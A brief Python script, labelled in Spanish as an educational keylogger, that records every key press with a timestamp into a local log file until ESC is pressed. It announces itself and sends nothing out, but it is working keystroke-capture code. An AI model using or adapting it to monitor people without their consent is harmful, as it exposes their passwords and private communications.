
import datetime
import os
import keyboard

os.makedirs("logs", exist_ok=True)
path = "logs/keylog.txt"

print("=== KEYLOGGER EDUCATIVO ===")
print("Presiona ESC para finalizar")
print(f"Guardando en: {path}")

with open(path, "a", encoding="utf-8") as f:
    f.write(f"\n=== Sesión iniciada: {datetime.datetime.now().isoformat()} ===\n")
    
    def on_key(event):
        f.write(f"{datetime.datetime.now().isoformat()} {event.name}\n")
        f.flush()
    
    keyboard.on_press(on_key)
    keyboard.wait('esc')

print("Terminado. Logs en:", path)
